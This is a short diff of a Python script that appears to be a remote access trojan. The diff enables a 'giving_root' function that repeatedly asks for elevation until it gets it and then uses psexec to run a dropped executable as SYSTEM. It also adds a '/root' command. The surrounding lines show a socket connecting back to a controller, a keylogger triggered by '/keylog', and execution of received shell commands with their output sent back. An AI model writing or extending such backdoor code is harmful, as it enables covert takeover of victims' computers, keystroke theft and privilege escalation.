@@ -80,14 +80,14 @@ def bat_create(file_path=""):
 
 #working process
 
-#def giving_root():
-#    while True:
-#        returno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.py", None, 0)
-#        if returno == 42:
-#           break
-#        else:
-#            print("[/] trying ...." + returno)
-#        time.sleep(random.randint(1,11))
+def giving_root():
+    while True:
+        returno = ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", u"-accepteula -nobanner -s -d " + temp_path + "\\clt.exe", None, 0)
+        if returno == 42:
+           break
+        else:
+            print("[/] trying ...." + returno)
+    time.sleep(random.randint(1,11))
 
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn.connect((IP,PORT))
@@ -122,8 +122,8 @@ while True:
     if cmd == "/keylog":
         with Listener(on_press = functionPK) as the_listener:  
             the_listener.join()
-#    if cmd == "/root":
-#        giving_root()
+    if cmd == "/root":
+        giving_root()
     os.system(cmd)
     output = subprocess.getoutput(cmd)
     conn.send(output.encode('utf-8'))
